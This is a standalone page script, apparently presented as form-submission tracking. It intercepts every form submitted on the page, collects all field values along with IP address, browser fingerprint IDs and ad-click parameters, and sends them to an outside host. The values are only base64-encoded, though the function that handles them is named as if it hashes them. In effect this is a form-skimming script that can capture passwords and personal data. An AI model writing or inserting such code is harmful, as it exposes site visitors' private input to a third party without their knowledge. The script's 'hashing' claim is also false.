<script>
  document.addEventListener('DOMContentLoaded', function() {
    document.body.addEventListener('submit', async function(event) {
      event.preventDefault(); // Prevent default form submission
      const formDataObj = {};
      const formData = new FormData(event.target);
      formData.forEach((value, key) => { formDataObj[key] = value; });

      const visitorData = getVisitorData();
      const ip = await getIPAddress();
      const payload = {
        event: 'form_submission',
        visitorData: { ...visitorData, ip },
        formData: hashFormData(formDataObj)
      };

      fetch('https://chat-xbot.webspecia.in/api/iwh/e935b7b32bd4d2fbff9d9614a4721702', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      }).then(response => console.log('Form tracking sent'))
        .catch(error => console.error('Tracking error:', error));

      event.target.submit(); // Submit the form after tracking
    }, true);

    function getVisitorData() {
      const urlParams = new URLSearchParams(window.location.search);
      return {
        gclid: urlParams.get('gclid') || null,
        fbclid: urlParams.get('fbclid') || null,
        userAgent: navigator.userAgent,
        referrer: document.referrer,
        pageURL: window.location.href,
        browserId: localStorage.getItem('browserId') || generateBrowserId(),
        sessionId: getSessionId()
      };
    }

    function generateBrowserId() {
      const id = 'browser-' + Math.random().toString(36).substr(2, 18);
      localStorage.setItem('browserId', id);
      return id;
    }

    function getSessionId() {
      let sessionId = sessionStorage.getItem('sessionId');
      if (!sessionId) {
        sessionId = 'session-' + Math.random().toString(36).substr(2, 18);
        sessionStorage.setItem('sessionId', sessionId);
      }
      return sessionId;
    }

    async function getIPAddress() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
      } catch (error) {
        return null;
      }
    }

    function hashFormData(formData) {
      const hashed = {};
      for (let key in formData) {
        hashed[key] = btoa(formData[key]);
      }
      return hashed;
    }
  });
</script>
